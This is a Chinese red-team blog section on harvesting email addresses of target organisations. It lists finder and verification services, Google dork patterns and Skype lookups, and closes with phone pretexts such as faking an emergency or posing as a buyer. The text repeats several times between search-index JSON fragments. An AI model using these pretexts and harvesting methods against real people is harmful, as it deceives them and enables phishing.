性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x06-邮箱收集技巧"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#使用邮箱地址查找工具"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#分类目标单位类型"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#邮件服务入口"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 